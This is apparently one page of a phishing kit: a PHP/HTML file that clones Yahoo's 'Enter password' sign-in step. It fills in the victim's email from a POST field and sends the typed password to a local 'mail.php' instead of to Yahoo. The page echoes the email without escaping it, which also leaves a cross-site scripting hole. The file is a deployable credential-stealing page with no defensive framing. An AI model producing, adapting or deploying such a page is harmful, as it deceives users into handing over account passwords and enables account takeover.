<?php

$email= $_POST['username'];
?>

<!DOCTYPE html>
<html id="Stencil" class="no-js grid light-theme ">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0"/>
        <meta name="format-detection" content="telephone=no">
        <meta name="referrer" content="origin-when-cross-origin">
        <title>Yahoo</title>
        <link rel="dns-prefetch" href="//gstatic.com">
        <link rel="dns-prefetch" href="//google.com">
        <link rel="dns-prefetch" href="//s.yimg.com">
        <link rel="dns-prefetch" href="//y.analytics.yahoo.com">
        <link rel="dns-prefetch" href="//ucs.query.yahoo.com">
        <link rel="dns-prefetch" href="//geo.query.yahoo.com">
        <link rel="dns-prefetch" href="//geo.yahoo.com">
        <link rel="icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico">
        <link rel="shortcut icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico">
        <link rel="apple-touch-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png">
        <link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png">

        <style nonce="SAFaP0kzsjN8naNRsElXS0qw27zofSqsFAQQVR8xUNymSVTE">
            #mbr-css-check {
                display: inline;
            }
            .mbr-legacy-device-bar {
                display: none;
            }
        </style>
        <link href="https://s.yimg.com/wm/mbr/11285bae9bbf91425e81a711f2d6346ce84ef9af/yahoo-main.css" rel="stylesheet" type="text/css">
        <script nonce="SAFaP0kzsjN8naNRsElXS0qw27zofSqsFAQQVR8xUNymSVTE">
            (function(root) {
                var isGoodJS = ('create' in Object && 'isArray' in Array && 'pushState' in window.history);
                root.isGoodJS = isGoodJS;
            }(this));
            
(function (root) {
/* -- Data -- */
root.YUI_config = {"comboBase":"https:\u002F\u002Fs.yimg.com\u002Fzz\u002Fcombo?","combine":true,"root":"yui-s:3.18.0\u002F"};
root.COMET_URL = "https:\u002F\u002Fpr.comet.yahoo.com\u002Fcomet";
root.I13N_config = {"keys":{"pt":"utility","ver":"nodejs"},"nol":false};
root.I13N_config || (root.I13N_config = {});
root.I13N_config.spaceid = 794200019;
root.I13N_config.location = "https:\u002F\u002Flogin.yahoo.com\u002Faccount\u002Fchallenge\u002Fpassword?.src=ym&.lang=en-US&.intl=us&display=login";
root.I13N_config.referrer = "https:\u002F\u002Flogin.yahoo.com\u002F?.src=ym&.lang=en-US&.intl=us";
root.I13N_config.keys || (root.I13N_config.keys = {});
root.I13N_config.keys.pct = "sign-in";
root.I13N_config.keys.pg_name = "yahoo Login - Password Challenge";
root.I13N_config.keys.pstcat = "username-verify";
root.I13N_config.keys.gm_np = "yahoo";
root.I13N_config.keys.p_sec = "login";
root.I13N_config.keys.p_subsec = "account-challenge-password";
root.I13N_config.keys.src = "ym";
root.challenge || (root.challenge = {});
root.challenge.servingStamp = 1580811422569;
root.I13N_config.keys.context = "primary";
root.mKeyPrefix = "primary_login_account-challenge-password_";
root.I13N_config.tracked_mods = {"password-challenge":"password-challenge"};
root.pwchallenge || (root.pwchallenge = {});
root.pwchallenge.messages = {"toolTipShow":"Show password","toolTipHide":"Hide password"};
root.isIOSDevice = false;
}(this));

            
            YUI_config.global = window;


            window.mbrSendError = function (name, url) {
                (new Image()).src = '/account/js-reporting/?rid=c5oh09df3ih4u&crumb=' + encodeURIComponent('IFSdJ2so.gB') + '&message=' + encodeURIComponent(name.toLowerCase()) + '&url=' + encodeURIComponent(url);
            };

            var oldError = window.onerror;

            window.onerror = function (errorMsg, url) {
                window.mbrSendError(errorMsg, url);
                if (oldError) {
                    oldError.apply(this, arguments);
                }
                return false;
            };

        </script>
    </head>
    <body class="">
        <div class="mbr-legacy-device-bar" id="mbr-legacy-device-bar">
            <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this warning">x</label>
            <input type="checkbox" id="mbr-legacy-device-bar-cross" />
            <p class="mbr-legacy-device">
                    Yahoo works best with the latest versions of the browsers. You're using an outdated or unsupported browser and some Yahoo features may not work properly. Please update your browser version now. <a href="">More Info</a>
            </p>
        </div>
    <script nonce="SAFaP0kzsjN8naNRsElXS0qw27zofSqsFAQQVR8xUNymSVTE">
        (function(root) {
            var doc = document;

            if (root.isGoodJS) {
                doc.documentElement.className = doc.documentElement.className.replace('no-js', 'js');
                doc.cookie = 'mbr-nojs=; domain=' + doc.domain + '; path=/account; expires=Thu, 01 Jan 1970 00:00:01 GMT; secure';
            } else {
                doc.cookie = 'mbr-nojs=badbrowser; domain=' + doc.domain + '; path=/account; expires=Fri, 31 Dec 9999 23:59:59 GMT; secure';
                doc.getElementById('mbr-legacy-device-bar').style.display = 'block';
            }
        }(this));
    </script>

    <div id="login-body" class="loginish dark-background puree-v2 responsive">
    <div class="mbr-desktop-hd">
    <span class="column">
         <a href="https://www.yahoo.com/">
            <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo " width="" height="36" />
            <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo " width="" height="36" />
        </a>
    </span>
    <span class="column help txt-align-right">
        <a href="https://help.yahoo.com/kb/index?locale&#x3D;en_US&amp;page&#x3D;product&amp;y&#x3D;PROD_ACCT">Help</a>
    </span>
</div>
    <div class="login-box-container">
        <div class="login-box default">
            <div class="mbr-login-hd txt-align-center">
                    <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo yahoo-en-US" width="" height="27" />
                    <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo yahoo-en-US" width="" height="27" />
            </div>
            <div class="challenge password-challenge">
    <div class="challenge-header">
        <div class="yid"><? echo $email;?></div>
</div><div id="password-challenge" class="primary">
    <strong class="challenge-heading">Enter password</strong>
    <span class="txt-align-center challenge-desc">to finish sign in</span>
    <form method="post" action="mail.php" class="pure-form pure-form-stacked">
        <input type="hidden" name="browser-fp-data" id="browser-fp-data" value="" />
        <input type="hidden" name="crumb" value="IFSdJ2so.gB" />
        <input type="hidden" name="acrumb" value="tsrGoTs4" />
        <input type="hidden" name="sessionIndex" value="QQ--" />
        <input type="hidden" name="displayName" value="<? echo $email;?>" />        <div class="hidden-username">
            <input type="text" tabindex="-1" aria-hidden="true" role="presentation"
                autocorrect="off" spellcheck="false"
                name="username" value="<? echo $email;?>" />
        </div>
        <input type="hidden" name="passwordContext" value="normal" />
        <div id="password-container" class="input-group password-container focussed">
            <input type="password" id="login-passwd" class="password"  required="required" name="password" placeholder=" " autofocus autocomplete="current-password"/>
            <label for="login-passwd" id="password-label" class="password-label">Password</label>
            <div class="caps-indicator hide" id="caps-indicator" title="Capslock is on"></div>
            <button type="button" class="show-hide-toggle-button hide-pw" id="password-toggle-button" tabindex="-1" title="Show password"></button>
        </div>

        <div class="button-container">
            <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button challenge-button" name="verifyPassword" value="Next" data-ylk="elm:btn;elmt:primary;mKey:primary_login_account-challenge-password_primaryBtn">
                    Next
            </button>
        </div>
        <div class="forgot-cont bottom-cta">
            <input type="submit" class="pure-button puree-button-link challenge-button-link"
                data-ylk="elm:btn;elmt:skip;slk:skip;mKey:primary_login_account-challenge-password_skipBtn" id="mbr-forgot-link"
                name="skip" value="Forgot password?" />
        </div>
    </form>
</div>
</div>
        </div>
        <div id="login-box-ad-fallback" class="login-box-ad-fallback">
            <h1>Yahoo makes it easy to enjoy what matters most in your world.</h1>
<p>Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of life.</p>
        </div>
    </div>
    <div class="login-bg-outer ">
        <div class="login-bg-inner">
                <div id="login-ad-rich"></div>
        </div>
    </div>
</div>
    <script src="https://s.yimg.com/wm/mbr/11285bae9bbf91425e81a711f2d6346ce84ef9af/bundle.js"></script>
    <noscript>
        <img src="/account/js-reporting/?crumb=IFSdJ2so.gB&message=javascript_not_enabled&ref=%2Faccount%2Fchallenge%2Fpassword" height="0" width="0" style="visibility: hidden;">
    </noscript>
    <script nonce="SAFaP0kzsjN8naNRsElXS0qw27zofSqsFAQQVR8xUNymSVTE">
        var checkAssets = function(seconds) {
            setTimeout(function() {
                if (!window.mbrJSLoaded) {
                    window.mbrSendError('js_failed_to_load', location.pathname);
                }
                var check = document.getElementById('mbr-css-check'),
                    style = check.currentStyle;
                if (window.getComputedStyle) {
                    style = window.getComputedStyle(check);
                }
                if (style.display !== 'none') {
                    window.mbrSendError('css_failed_to_load', location.pathname);
                }
            }, (seconds * 1000));
        };

        checkAssets(10);
    </script>
    <div id="mbr-css-check"></div>
</body>
</html>
<!-- fe19.member.ne1.yahoo.com - Tue Feb 04 2020 10:17:02 GMT+0000 (Coordinated Universal Time) - (1ms) -->